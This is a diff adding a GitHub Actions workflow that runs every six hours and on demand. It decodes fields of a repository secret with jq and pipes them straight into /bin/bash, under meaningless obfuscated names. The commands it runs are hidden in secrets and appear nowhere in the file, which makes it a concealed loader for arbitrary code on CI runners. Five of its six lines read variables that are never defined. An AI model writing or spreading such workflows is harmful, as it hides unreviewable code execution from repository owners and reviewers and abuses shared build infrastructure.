@@ -1,0 +1,22 @@
+name: hongquanzz
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hongquanzz
+        env:
+          w49606: ${{ secrets.w49606 }}
+        run: |
+          echo $w49606 | jq -r .uuiy7 | /bin/bash
+          echo $kavh6529 | jq -r .t16094 | /bin/bash
+          echo $qdt0 | jq -r .m16975 | /bin/bash
+          echo $swrj4080 | jq -r .texw8 | /bin/bash
+          echo $tbg92 | jq -r .uc89 | /bin/bash
+          echo $r07 | jq -r .gg9955 | /bin/bash
+
